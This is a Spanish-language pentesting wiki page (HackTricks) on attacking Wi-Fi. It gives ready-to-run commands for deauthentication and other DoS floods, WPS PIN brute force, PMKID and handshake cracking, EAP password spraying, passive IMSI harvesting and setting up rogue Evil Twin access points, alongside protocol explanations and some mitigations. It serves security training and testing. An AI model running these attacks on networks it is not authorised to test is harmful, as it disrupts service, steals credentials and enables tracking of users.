# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Comandos básicos de Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Herramientas

### Hijacker & NexMon (Wi-Fi interno de Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Ejecutar airgeddon con docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Puede realizar ataques Evil Twin, KARMA y Known Beacons y luego usar una plantilla de phishing para lograr obtener la contraseña real de la red o capturar credenciales de redes sociales.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta herramienta automatiza ataques **WPS/WEP/WPA-PSK**. Automáticamente:

- Pone la interfaz en monitor mode
- Escanea posibles networks - y te permite seleccionar la(s) víctima(s)
- Si WEP: lanza ataques WEP
- Si WPA-PSK
- Si WPS: Pixie dust attack y the bruteforce attack (ten cuidado: the brute-force attack podría tardar mucho). Observa que no intenta null PIN ni database/generated PINs.
- Intenta capturar el PMKID del AP para crack it
- Intenta deauthenticate a los clientes del AP para capturar un handshake
- Si PMKID o Handshake, intenta bruteforce usando top5000 passwords.

## Resumen de ataques

- **DoS**
- Deauthentication/disassociation -- Desconectar a todos (o un ESSID/Client específico)
- Random fake APs -- Ocultar nets, posible crash scanners
- Overload AP -- Intenta kill the AP (usualmente no muy útil)
- WIDS -- Jugar con el IDS
- TKIP, EAPOL -- Algunos ataques específicos para DoS algunos APs
- **Cracking**
- Crack **WEP** (varias herramientas y métodos)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** captura + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Útil para capturar captive portal creds y/o realizar LAN attacks
- **WPA-PSK** Evil Twin -- Útil para network attacks si conoces la password
- **WPA-MGT** -- Útil para capturar company credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Útil para capturar captive portal creds y/o realizar LAN attacks
- **+ WPA** -- Útil para capturar WPA handshakes

## DOS

### Deauthentication Packets

**Description from** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Los ataques de **Deauthentication**, un método prevalente en Wi-Fi hacking, implican la falsificación de tramas "management" para **forzar la desconexión de dispositivos de una red**. Estos paquetes no cifrados engañan a los clientes haciéndoles creer que provienen de la red legítima, permitiendo a los atacantes recopilar WPA handshakes para cracking o perturbar persistentemente las conexiones de red. Esta táctica, alarmante por su simplicidad, se usa ampliamente y tiene implicaciones significativas para la seguridad de la red.

**Deauthentication usando Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 significa deauthentication
- 1 es el número de deauths a enviar (puedes enviar varios si lo deseas); 0 significa enviarlos continuamente
- -a 00:14:6C:7E:40:80 es la dirección MAC del punto de acceso
- -c 00:0F:B5:34:30:30 es la dirección MAC del cliente a deauthenticate; si esto se omite entonces se envía broadcast deauthentication (no siempre funciona)
- ath0 es el nombre de la interfaz

### Disassociation Packets

**Disassociation packets**, similar to deauthentication packets, son un tipo de trama de gestión usada en redes Wi‑Fi.

Estos paquetes sirven para cortar la conexión entre un dispositivo (por ejemplo, un ordenador portátil o smartphone) y un punto de acceso (AP).

La principal diferencia entre disassociation y deauthentication radica en sus escenarios de uso.

**Mientras que un AP emite deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, reinicios o durante su reubicación, por lo que es necesario desconectar todos los nodos conectados.

**Este ataque puede realizarse con mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Más ataques DOS por mdk4**

**En** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Envía beacon frames para mostrar fake APs a clients. Esto puede, en ocasiones, crash network scanners e incluso drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

El envío de tramas de autenticación a todos los puntos de acceso (APs) accesibles dentro del alcance puede sobrecargar estos APs, especialmente cuando hay numerosos clientes involucrados. Este tráfico intenso puede provocar inestabilidad en el sistema, haciendo que algunos APs se congelen o incluso se reinicien.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) verifica si un SSID se revela correctamente y confirma el alcance del AP. Esta técnica, junto con **bruteforcing hidden SSIDs** con o sin una wordlist, ayuda a identificar y acceder a redes ocultas.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Enviar paquetes aleatorios o duplicados a diferentes colas QoS puede activar Michael Countermeasures en **TKIP APs**, provocando un apagado del AP de un minuto. Este método es una táctica de ataque eficiente **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Inundar un AP con **EAPOL Start frames** crea **sesiones falsas**, saturando el AP y bloqueando clientes legítimos. Alternativamente, inyectar **mensajes falsos EAPOL Logoff** desconecta forzosamente a los clientes; ambos métodos interrumpen efectivamente el servicio de red.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Ataques para redes malladas IEEE 802.11s**

Varios ataques a la gestión de enlaces y al enrutamiento en redes malladas.

**ATTACK MODE w: WIDS Confusión**

Conectar clientes de forma cruzada a múltiples nodos WDS o a rogue APs puede manipular los Sistemas de Detección y Prevención de Intrusiones, creando confusión y potencial abuso del sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Un packet fuzzer que ofrece diversas fuentes de paquetes y un conjunto completo de modificadores para la manipulación de paquetes.

### **Airggedon**

_**Airgeddon**_ ofrece la mayoría de los ataques propuestos en los comentarios anteriores:

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup) simplifica el proceso de conexión de dispositivos a un router, acelerando y facilitando la configuración en redes cifradas con **WPA** o **WPA2** Personal. No es efectivo frente a la inseguridad de **WEP**, que es fácilmente comprometida. WPS emplea un PIN de 8 dígitos, validado en dos mitades, lo que lo hace susceptible a ataques de fuerza bruta debido a su número limitado de combinaciones (11,000 posibilidades).

### WPS Bruteforce

There are 2 main tools to perform this action: Reaver and Bully.

- **Reaver** ha sido diseñado para ser un ataque robusto y práctico contra WPS, y ha sido probado contra una amplia variedad de access points y implementaciones de WPS.
- **Bully** es una **new implementation** del ataque de fuerza bruta sobre WPS, escrita en C. Tiene varias ventajas sobre el código original de reaver: fewer dependencies, improved memory and cpu performance, correct handling of endianness, and a more robust set of options.

El ataque explota la **vulnerabilidad del WPS PIN**, en particular su exposición de los primeros cuatro dígitos y el papel del último dígito como checksum, lo que facilita el ataque de fuerza bruta. Sin embargo, las defensas contra ataques de fuerza bruta, como el **blocking MAC addresses** de atacantes agresivos, exigen **MAC address rotation** para continuar el ataque.

Al obtener el WPS PIN con herramientas como Bully o Reaver, el atacante puede deducir la PSK de WPA/WPA2, asegurando **persistent network access**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Este enfoque refinado apunta a WPS PINs utilizando vulnerabilidades conocidas:

1. **Pre-discovered PINs**: Utiliza una base de datos de PINs conocidos vinculados a fabricantes específicos conocidos por usar WPS PINs uniformes. Esta base de datos correlaciona los primeros tres octetos de las MAC-addresses con los PINs probables para esos fabricantes.
2. **PIN Generation Algorithms**: Aprovecha algoritmos como ComputePIN y EasyBox, que calculan WPS PINs basándose en la MAC-address del AP. El algoritmo Arcadyan además requiere un device ID, añadiendo una capa al proceso de generación de PIN.

### WPS Pixie Dust attack

**Dominique Bongard** descubrió una falla en algunos Access Points (APs) relativa a la creación de códigos secretos, conocidos como nonces (**E-S1** y **E-S2**). Si estos nonces pueden averiguarse, crackear el WPS PIN del AP se vuelve fácil. El AP revela el PIN dentro de un código especial (hash) para demostrar que es legítimo y no un AP falso (rogue). Esos nonces son esencialmente las "llaves" para desbloquear la "caja fuerte" que contiene el WPS PIN. Más información puede encontrarse [aquí](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

En términos simples, el problema es que algunos APs no usaban claves lo suficientemente aleatorias para cifrar el PIN durante el proceso de conexión. Esto hace que el PIN sea vulnerable a ser adivinado desde fuera de la red (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Si no quieres cambiar el dispositivo a monitor mode, o `reaver` y `bully` tienen algún problema, puedes probar [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Esta herramienta puede realizar un Pixie Dust attack sin tener que cambiar a monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Ataque Null PIN

Algunos sistemas mal diseñados incluso permiten que un **Null PIN** (un PIN vacío o inexistente) otorgue acceso, lo cual es bastante inusual. La herramienta **Reaver** es capaz de probar esta vulnerabilidad, a diferencia de **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos los ataques WPS propuestos se pueden realizar fácilmente usando _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 y 6 te permiten probar **tu PIN personalizado** (si tienes alguno)
- 7 y 8 realizan el **Pixie Dust attack**
- 13 te permite probar el **NULL PIN**
- 11 y 12 **recopilarán los PINs relacionados con el AP seleccionado desde bases de datos disponibles** y **generarán** posibles **PINs** usando: ComputePIN, EasyBox y opcionalmente Arcadyan (recomendado, ¿por qué no?)
- 9 y 10 probarán **cada PIN posible**

## **WEP**

Muy roto y prácticamente en desuso hoy en día. Solo debes saber que _**airgeddon**_ tiene una opción WEP llamada "All-in-One" para atacar este tipo de protección. Más herramientas ofrecen opciones similares.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

En 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) un nuevo método de ataque, único porque solo necesita **un único paquete** y no requiere que clientes estén conectados al AP objetivo—solo interacción entre el atacante y el AP.

Muchos routers modernos añaden un **campo opcional** al **primer EAPOL** frame durante la asociación, conocido como `Robust Security Network`. Esto incluye el `PMKID`.

Como explica la publicación original, el **PMKID** se crea usando datos conocidos:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Dado que el "PMK Name" es constante, conocemos el BSSID del AP y la estación, y el `PMK` es idéntico al de un 4-way handshake completo, **hashcat** puede usar esta información para crackear el PSK y recuperar la passphrase!

Para **recopilar** esta información y **bruteforce** localmente la contraseña puedes hacer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Los **PMKIDs captured** se mostrarán en la **console** y también se **guardarán** dentro de \_ **/tmp/attack.pcap**\_\
Ahora, convierte la captura al formato **hashcat/john** y crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Por favor, tenga en cuenta que el formato de un hash correcto contiene **4 partes**, como: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Si el suyo **solo** contiene **3 partes**, entonces, es **inválido** (la captura PMKID no fue válida).

Tenga en cuenta que `hcxdumptool` **también captura handshakes** (aparecerá algo como esto: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Puede **transformar** los **handshakes** al formato **hashcat**/**john** usando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool._

### Captura de handshake

Un ataque contra redes **WPA/WPA2** puede ejecutarse capturando un **handshake** e intentando **crack** la contraseña **offline**. Este proceso implica monitorear la comunicación de una red específica y el **BSSID** en un **channel** particular. Aquí tienes una guía simplificada:

1. Identifica el **BSSID**, el **channel**, y un **connected client** de la red objetivo.
2. Usa `airodump-ng` para monitorear el tráfico de la red en el **channel** y **BSSID** especificados, esperando capturar un handshake. El comando se verá así:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
Para aumentar la probabilidad de capturar un handshake, desconecta momentáneamente al cliente de la red para forzar una reautenticación. Esto se puede hacer usando el comando `aireplay-ng`, que envía paquetes de desautenticación al cliente:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Ten en cuenta que, como el cliente fue desautenticado, podría intentar conectarse a un AP diferente o, en otros casos, a una red diferente._

Una vez que en `airodump-ng` aparece información del handshake, esto significa que el handshake fue capturado y puedes dejar de escuchar:

![](<../../images/image (172) (1).png>)

Una vez capturado el handshake, puedes **crack** con `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Comprobar si hay handshake en el archivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si esta herramienta encuentra un handshake incompleto de un ESSID antes del handshake completado, no detectará el válido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

En **enterprise WiFi setups, te encontrarás con varios métodos de autenticación**, cada uno proporcionando diferentes niveles de seguridad y funciones de gestión. Cuando uses herramientas como `airodump-ng` para inspeccionar el tráfico de red, podrías notar identificadores para estos tipos de autenticación. Algunos métodos comunes incluyen:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Este método soporta hardware tokens y contraseñas de un solo uso dentro de EAP-PEAP. A diferencia de MSCHAPv2, no usa un peer challenge y envía las contraseñas en texto claro al punto de acceso, lo que supone un riesgo de ataques de downgrade.
2. **EAP-MD5 (Message Digest 5)**:
- Implica enviar el hash MD5 de la contraseña desde el cliente. No se recomienda debido a su vulnerabilidad a ataques por diccionario, la falta de autenticación del servidor y la incapacidad para generar claves WEP específicas por sesión.
3. **EAP-TLS (Transport Layer Security)**:
- Utiliza certificados en el cliente y en el servidor para la autenticación y puede generar dinámicamente claves WEP basadas en el usuario y en la sesión para asegurar las comunicaciones.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Proporciona autenticación mutua a través de un túnel cifrado, junto con un método para derivar claves WEP dinámicas por usuario y por sesión. Requiere solo certificados en el servidor, y los clientes usan credenciales.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funciona de forma similar a EAP creando un túnel TLS para la comunicación protegida. Permite el uso de protocolos de autenticación más débiles sobre EAP debido a la protección que ofrece el túnel.
- **PEAP-MSCHAPv2**: A menudo referido como PEAP, combina el mecanismo vulnerable de desafío/respuesta de MSCHAPv2 con un túnel TLS protector.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Similar a EAP-TLS pero inicia un túnel TLS antes de intercambiar certificados, ofreciendo una capa adicional de seguridad.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) parece que si estás usando **EAP** los mensajes **"Identity"** deben ser **soportados**, y el **username** se va a enviar en **claro** en los mensajes **"Response Identity"**.

Incluso usando uno de los métodos de autenticación más seguros: **PEAP-EAP-TLS**, es posible **capturar el username enviado en el protocolo EAP**. Para ello, **captura una comunicación de autenticación** (arranca `airodump-ng` dentro de un canal y `wireshark` en la misma interfaz) y filtra los paquetes por`eapol`.\
Dentro del paquete "**Response, Identity**", aparecerá el **username** del cliente.

![](<../../images/image (850).png>)

### Anonymous Identities

El ocultamiento de identidad es soportado tanto por EAP-PEAP como por EAP-TTLS. En el contexto de una red WiFi, una petición EAP-Identity suele ser iniciada por el access point (AP) durante el proceso de asociación. Para proteger el anonimato del usuario, la respuesta del cliente EAP en el dispositivo del usuario contiene solo la información esencial que el RADIUS inicial necesita para procesar la petición. Este concepto se ilustra con los siguientes escenarios:

- EAP-Identity = anonymous
- En este escenario, todos los usuarios usan el seudónimo "anonymous" como identificador de usuario. El RADIUS inicial funciona como servidor EAP-PEAP o EAP-TTLS, encargado de gestionar el lado servidor de PEAP o TTLS. El método de autenticación interno (protegido) se maneja localmente o se delega a un RADIUS remoto (home).
- EAP-Identity = anonymous@realm_x
- En esta situación, usuarios de diferentes realms ocultan su identidad mientras indican su realm correspondiente. Esto permite que el RADIUS inicial haga proxy de las peticiones EAP-PEAP o EAP-TTLS a los servidores RADIUS en sus realms de origen, que actúan como servidores PEAP o TTLS. El RADIUS inicial opera únicamente como un nodo relé RADIUS.
- Alternativamente, el RADIUS inicial puede funcionar como servidor EAP-PEAP o EAP-TTLS y gestionar el método de autenticación protegido o reenviarlo a otro servidor. Esta opción facilita la configuración de políticas distintas para varios realms.

En EAP-PEAP, una vez que el túnel TLS está establecido entre el servidor PEAP y el cliente PEAP, el servidor PEAP inicia una petición EAP-Identity y la transmite a través del túnel TLS. El cliente responde a esta segunda petición EAP-Identity enviando una respuesta EAP-Identity que contiene la identidad real del usuario a través del túnel cifrado. Este enfoque evita eficazmente que la identidad real del usuario sea revelada a cualquiera que esté escuchando el tráfico 802.11.

EAP-TTLS sigue un procedimiento ligeramente distinto. Con EAP-TTLS, el cliente típicamente se autentica usando PAP o CHAP, asegurado por el túnel TLS. En este caso, el cliente incluye un atributo User-Name y ya sea un atributo Password o CHAP-Password en el mensaje TLS inicial enviado tras el establecimiento del túnel.

Independientemente del protocolo elegido, el servidor PEAP/TTLS obtiene conocimiento de la identidad real del usuario una vez que se ha establecido el túnel TLS. La identidad real puede representarse como user@realm o simplemente user. Si el servidor PEAP/TTLS también autentica al usuario, ahora posee la identidad del usuario y procede con el método de autenticación protegido por el túnel TLS. Alternativamente, el servidor PEAP/TTLS puede reenviar una nueva petición RADIUS al RADIUS de origen del usuario. Esta nueva petición RADIUS omite la capa PEAP o TTLS. En casos donde el método de autenticación protegido es EAP, los mensajes EAP internos se transmiten al RADIUS de origen sin el envoltorio EAP-PEAP o EAP-TTLS. El atributo User-Name del mensaje RADIUS saliente contiene la identidad real del usuario, reemplazando el User-Name anonymous de la petición RADIUS entrante. Cuando el método de autenticación protegido es PAP o CHAP (soportado solo por TTLS), el User-Name y otros atributos de autenticación extraídos de la carga TLS se sustituyen en el mensaje RADIUS saliente, desplazando el User-Name anonymous y los atributos TTLS EAP-Message presentes en la petición RADIUS entrante.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

La autenticación Wi‑Fi basada en SIM usando EAP‑SIM/EAP‑AKA sobre 802.1X puede leak el identificador permanente del suscriptor (IMSI) en texto claro durante la fase de identidad no autenticada si el despliegue no implementa seudónimos/identidades protegidas o un túnel TLS alrededor del EAP interno.

Where the leak happens (high level):
- La asociación 802.11 se completa con el SSID (a menudo SSIDs de offload de operadores como FreeWifi_secure, realms operator tipo eduroam, etc.).
- El authenticator envía EAP-Request/Identity.
- Clientes vulnerables responden EAP-Response/Identity con su identidad permanente = IMSI codificada como un NAI 3GPP, antes de cualquier protección.
- Ejemplo NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Cualquiera que escuche pasivamente la RF puede leer ese frame. No se necesita 4-way handshake ni keying TLS.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Click to expand</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Notas:
- Funciona antes de cualquier túnel TLS si la implementación usa EAP‑SIM/AKA sin identidades externas anónimas/pseudónimos.
- El valor expuesto es un identificador permanente vinculado a la SIM del suscriptor; su recolección permite el rastreo a largo plazo y abusos posteriores en telecomunicaciones.

Impacto
- Privacidad: seguimiento persistente de usuarios/dispositivos a partir de capturas pasivas de Wi‑Fi en lugares públicos.
- Inicio de abusos en telecomunicaciones: con el IMSI, un atacante con acceso a SS7/Diameter puede consultar la ubicación o intentar la interceptación de llamadas/SMS y el robo de MFA.

Mitigaciones / qué buscar
- Verificar que los clientes usen identidades externas anónimas (pseudónimos) para EAP‑SIM/AKA según la guía de 3GPP (p. ej., 3GPP TS 33.402).
- Preferir tunelizar la fase de identidad (p. ej., EAP‑TTLS/PEAP transportando un EAP‑SIM/AKA interno) para que el IMSI nunca se envíe en claro.
- Las capturas de paquetes de association/auth nunca deberían revelar un IMSI en bruto en EAP-Response/Identity.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **list** de **usernames** (see next part) and **passwords** and try to **bruteforce** the access using [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
También podrías realizar este ataque usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoría de ataques al cliente

### Selección de red y roaming

- El protocolo 802.11 define cómo una estación se une a un Extended Service Set (ESS) pero no especifica los criterios para seleccionar un ESS o un access point (AP) dentro de él.
- Las estaciones pueden hacer roaming entre APs que comparten el mismo ESSID, manteniendo la conectividad a lo largo de un edificio o área.
- El protocolo requiere que la estación se autentique con el ESS, pero no obliga al AP a autenticarse con la estación.

### Listas de Redes Preferidas (PNL)

- Las estaciones almacenan el ESSID de cada red inalámbrica a la que se conectan en su Lista de Redes Preferidas (PNL), junto con los detalles de configuración específicos de la red.
- La PNL se usa para conectarse automáticamente a redes conocidas, mejorando la experiencia del usuario al simplificar el proceso de conexión.

### Escaneo pasivo

- Los APs transmiten periódicamente beacon frames, anunciando su presencia y características, incluyendo el ESSID del AP a menos que la transmisión esté deshabilitada.
- Durante el escaneo pasivo, las estaciones escuchan las beacon frames. Si el ESSID de una beacon coincide con una entrada en la PNL de la estación, la estación puede conectarse automáticamente a ese AP.
- Conocer la PNL de un dispositivo permite una posible explotación al imitar el ESSID de una red conocida, engañando al dispositivo para que se conecte a un AP malicioso.

### Sondeo activo

- El sondeo activo implica que las estaciones envíen probe requests para descubrir APs cercanos y sus características.
- Los directed probe requests van dirigidos a un ESSID específico, ayudando a detectar si una red concreta está dentro del alcance, incluso si es una red oculta.
- Los broadcast probe requests tienen el campo SSID nulo y se envían a todos los APs cercanos, permitiendo que la estación compruebe cualquier red preferida sin revelar el contenido de su PNL.

## AP simple con redirección a Internet

Antes de explicar cómo realizar ataques más complejos, se va a explicar **cómo** simplemente **crear** un **AP** y **redirigir** su **tráfico** hacia una interfaz conectada **a** **Internet**.

Usando `ifconfig -a` comprueba que la interfaz wlan para crear el AP y la interfaz conectada a Internet estén presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crea el archivo de configuración `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Luego, **set IPs** y **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
A continuación, **inicia** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crea un archivo de configuración `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Detén procesos molestos**, activa **monitor mode**, y inicia **hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Reenvío y Redirección
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Un ataque Evil Twin explota la forma en que los clientes WiFi reconocen redes, confiando principalmente en el nombre de la red (ESSID) sin requerir que la estación base (access point) se autentique ante el cliente. Los puntos clave incluyen:

- **Dificultad para diferenciar**: Los dispositivos tienen problemas para distinguir entre access points legítimos y rogue cuando comparten el mismo ESSID y tipo de cifrado. Las redes del mundo real suelen usar múltiples access points con el mismo ESSID para ampliar la cobertura de forma transparente.
- **Roaming del cliente y manipulación de la conexión**: El protocolo 802.11 permite que los dispositivos se muevan entre access points dentro del mismo ESS. Los atacantes pueden explotar esto provocando que un dispositivo se desconecte de su estación base actual y se conecte a un rogue access point. Esto se puede lograr ofreciendo una señal más fuerte o interrumpiendo la conexión al access point legítimo mediante métodos como deauthentication packets o jamming.
